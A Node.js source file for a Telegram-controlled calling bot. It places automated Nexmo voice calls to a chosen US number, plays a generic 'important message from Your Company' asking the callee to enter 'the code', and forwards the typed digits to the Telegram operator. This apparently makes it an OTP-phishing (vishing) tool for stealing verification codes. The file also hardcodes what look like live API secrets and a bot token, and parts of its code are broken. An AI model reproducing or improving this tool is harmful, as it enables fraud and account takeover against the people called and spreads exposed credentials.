const express = require('express');
const bodyParser = require('body-parser');
const request = require('request');
const http = require('http');
const Nexmo = require('nexmo');
const TelegramBot = require('node-telegram-bot-api');

const app = express();
const port = process.env.PORT || 3000;

// Nexmo Configuration
const nexmo = new Nexmo({
  apiKey: '682b0a0b',
  apiSecret: 'chirpert00L',
  applicationId: 'ce291c47-10f5-4c02-a7a8-533a34365d4c',
  privateKey: './chirper.key'
});

// Telegram Bot Configuration
const bot = new TelegramBot('6470896987:AAEPPOpl5wUlSqONhB_gT7ojtG902PM8qx0', { polling: true });

app.use(bodyParser.json());

// Map to store ongoing calls
const activeCalls = {};

// Endpoint for handling Telegram Bot command /call
// Regex for a simple US phone number format
const phoneNumberRegex = /^\+?1?\d{10}$/;

// Endpoint for handling Telegram Bot command /call
bot.onText(/\/call (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const customerNumber = match[1];

  if (phoneNumberRegex.test(customerNumber)) {
    bot.sendMessage(chatId, 'Please wait. Initiating call...');
    initiateCall(chatId, customerNumber);
  } else {
    bot.sendMessage(chatId, 'Invalid phone number format. Please provide a valid US phone number.');
  }
});
// Endpoint for handling Telegram Bot command /help
bot.onText(/\/help/, (msg) => {
  const chatId = msg.chat.id;

  const helpMessage = `Available commands:
    /call [phone_number] - Initiate a call to the specified phone number.
    /endcall - End the ongoing call.
    /help - Display this help message.`;

  bot.sendMessage(chatId, helpMessage);
});

// Endpoint for handling Telegram Bot command /endcall
bot.onText(/\/endcall/, (msg) => {
  const chatId = msg.chat.id;

  if (activeCalls[chatId]) {
    // If there is an active call, end it
    nexmo.calls.update(activeCalls[chatId], { action: 'hangup' }, (err) => {
      if (err) {
        console.error(err);
        bot.sendMessage(chatId, 'Failed to end the call.');
      } else {
        bot.sendMessage(chatId, 'Call ended successfully.');
        delete activeCalls[chatId];
      }
    });
  } else {
    bot.sendMessage(chatId, 'No active call to end.');
  }
});

// Listen for incoming messages with customer phone number
bot.on('message', (msg) => {
  const chatId = msg.chat.id;

  if (activeCalls[chatId]) {
    // If an active call exists for this chat, treat the message as the user input code
    const userResponse = msg.text;
    bot.sendMessage(chatId, `You entered: ${userResponse}`);
    // Process user input or take further actions as needed
    // You may also consider ending the call or taking additional actions
    delete activeCalls[chatId];
  } else if (msg.text && msg.text.startsWith('/call')) {
    // Extract the customer's phone number from the command
    const customerNumber = msg.text.split(' ')[1];

    // Nexmo Call API
    nexmo.calls.create(
      {
        to: [
          {
            type: 'phone',
            number: customerNumber,
          },
        ],
        from: {
          type: 'phone',
          number: '12037049944',
        },
        ncco: [
          {
            action: 'talk',
            voiceName: 'Amy',
            text: 'Hello! This is an important message from Your Company. Please enter the code provided in the call.',
            bargeIn: true,
          },
          {
            action: 'input',
            eventUrl: [`${request.protocol}://${request.get('host')}/webhooks/dtmf`],
            submitOnHash: true,
          },
        ],
      },
      (err, response) => {
        if (err) {
          console.error(err);
          bot.sendMessage(chatId, 'Failed to initiate call.');
        } else {
          bot.sendMessage(chatId, 'Call initiated successfully. Please wait for the call.');
          // Save the call ID for later reference
          activeCalls[chatId] = response.uuid;
        }
      }
    );
  }
});

// Endpoint for handling DTMF input
app.post('/webhooks/dtmf', (req, res) => {
  const chatId = req.body.chatId;
  const userResponse = req.body.dtmf.digits;
  // Forward user input to the Telegram Bot
  bot.sendMessage(chatId, `User entered: ${userResponse}`);
  res.status(204).send();
});

app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});
